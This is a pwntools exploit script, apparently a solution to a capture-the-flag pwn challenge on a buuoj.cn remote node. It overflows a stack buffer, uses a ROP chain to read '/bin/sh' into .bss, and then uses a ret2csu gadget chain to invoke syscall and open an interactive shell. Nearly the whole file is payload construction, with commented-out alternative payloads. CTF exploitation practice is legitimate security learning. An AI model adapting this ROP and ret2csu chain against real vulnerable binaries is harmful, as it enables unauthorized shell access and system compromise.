from pwn import *

#io = process('./pwn')
io = remote('node4.buuoj.cn',27623)

context.log_level = 'debug'

p_csu = 0x40072a
p_call_r12 = 0x400710
#p_cat_flag = 0x601040
p_cat_flag = 0x4007bb
p_syscall = 0x601068
#p_sysread = 0x4006B9
p_sysread = 0x40064f
p_main = 0x400666

def csu(rbx,rbp,r12,r13,r14,r15,ret_addr):
    # pop rbx,rbp,r12,r13,r14,r15
    # rbx should be 0,
    # rbp should be 1,enable not to jump
    # r12 should be the function we want to call
    # rdi=edi=r13
    # rsi=r14
    # rdx=r15
    payload = p64(0x68732f6e69622f)+ b'a' * 0x18 + b'b' * 0x8 + p64(p_csu) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
    payload += p64(p_call_r12)
    payload += p64(ret_addr)
    #payload += b'aaaaaa' + b'\xf0\x62'
    io.recvuntil(b'this elf.Remember to check it!')
    raw_input('>')
    io.send(payload)

#poprsi ret  r15 bss 1 sys_read  main
pop_rsi = 0x400731
p_bss = 0x6010a0
payload = b'a' * 0x20 + b'b' * 8 + p64(pop_rsi) + p64(p_bss) + p64(0) + p64(p_sysread) + p64(0x6010a8) + p64(p_main)  #这是第一种的payload
#payload = b'a' * 0x20 + b'b' * 8 + p64(pop_rsi) + p64(p_bss) + p64(0) + p64(p_sysread) +p64(1) #这是第二种的payload 因为这个syscall gadget在ret前pop rbp，所以加了一个

#def csu(rbx,rbp,r12,r13,r14,r15,ret_addr):
#csu(0,1,p_syscall,0x601080,0,0,1)
#payload += p64(p_csu) + p64(0) + p64(1) + p64(p_syscall) + p64(0x601080) + p64(0) + p64(0)
#payload += p64(p_call_r12)


io.recvuntil(b'check it!')
#raw_input('>')
io.send(payload)
#raw_input('>')
binsh = b'/bin/sh\x00' + p64(p_main)
io.send(binsh)
csu(0,1,p_syscall,0x601088,0,0,1)
io.interactive()
